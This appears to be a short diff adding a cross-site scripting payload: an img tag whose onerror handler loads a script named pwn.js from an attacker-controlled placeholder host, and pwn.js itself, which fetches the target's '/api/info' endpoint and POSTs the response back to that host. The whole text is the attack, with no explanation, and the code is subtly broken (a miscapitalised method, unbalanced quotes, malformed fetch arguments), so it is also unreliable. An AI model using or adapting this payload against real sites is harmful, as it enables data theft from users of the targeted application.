@@ -1,0 +1,6 @@
+<img src=x onerror="this.remove(); var s = document.CreateElement('script'); s.src = "http://<myip>:<myport>/pwn.js"; document.body.appendChild(s);></img>
+
+pwn.js
+
+fetch('http://<targetip>/api/info').then(r=>r.text).then(d=>fetch('http://<myip>:<myport>',
+method:'POST', mode: 'no-cors', body: d,))
